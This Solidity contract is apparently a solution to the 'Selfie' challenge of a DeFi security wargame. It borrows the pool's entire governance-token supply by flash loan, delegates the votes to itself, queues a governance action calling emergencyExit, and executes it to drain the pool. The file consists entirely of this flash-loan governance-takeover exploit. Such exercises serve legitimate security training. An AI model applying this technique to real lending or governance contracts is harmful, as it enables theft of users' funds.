// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import {DamnValuableVotes} from "../DamnValuableVotes.sol";
import {SelfiePool} from "./SelfiePool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {SimpleGovernance} from "./SimpleGovernance.sol";

contract Selfie is IERC3156FlashBorrower{
    SimpleGovernance public immutable simpleGovernance;
    DamnValuableVotes public immutable damnValuableVotes;
    SelfiePool public immutable selfiePool;

    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    uint256 constant TOKENS_IN_POOL = 1_500_000e18;
    uint256 actionId;

    constructor(SimpleGovernance _simpleGovernance, DamnValuableVotes _damnValuableVotes, SelfiePool _selfiePool){
        simpleGovernance = _simpleGovernance;
        damnValuableVotes = _damnValuableVotes;
        selfiePool = _selfiePool;
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        if(initiator != address(this) || msg.sender != address(selfiePool) || token != address(damnValuableVotes)) revert();

        damnValuableVotes.delegate(address(this));
        damnValuableVotes.approve(msg.sender, amount);

        actionId = simpleGovernance.queueAction(address(selfiePool), 0, data);

        return CALLBACK_SUCCESS;
    }

    function callSelfiePool(address recovery) public {
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", recovery);
        selfiePool.flashLoan(IERC3156FlashBorrower(address(this)), address(damnValuableVotes), TOKENS_IN_POOL,  data);
    }

    function execute() public{
        simpleGovernance.executeAction(actionId);
    }

}